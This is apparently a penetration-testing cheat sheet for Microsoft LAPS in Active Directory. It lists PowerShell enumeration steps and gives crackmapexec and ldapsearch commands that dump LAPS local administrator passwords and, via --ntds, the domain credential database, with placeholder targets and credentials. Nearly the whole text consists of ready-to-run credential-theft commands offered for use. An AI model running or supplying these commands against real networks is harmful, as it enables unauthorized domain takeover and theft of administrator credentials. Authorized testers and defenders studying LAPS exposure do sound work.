# ENUMERATION

#### dir "C:\Program\LAPS\CSE"

### If admpwd.dll exists, then enumeration is successful.

#### 1) Get-Command *Admpwd*

#### 2) Find-AdmPwdExtendedRights -Identity *

#### 3) net groups "GROUP_THAT_HAS_ACCESS_TO_LAPS"

#### 4) Get-AdmPwdPassword -ComputerName PC_THAT_HAS_LAPS_ENABLED

## Possible tools: LAPSToolkit, Crackmapexec, ldapsearch

### If a user has access to view the LAPS password, we can use crackmapexec or ldapsearch to dump password:

#### crackmapexec smb IP_ADDRESS -u USER -p PASSWORD --laps --ntds

#### ldapsearch -h IP_ADDRESS -b 'DC=DOMAIN,DC=LOCAL' -x -D USER@DOMAIN.LOCAL -w 'PASSWORD' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
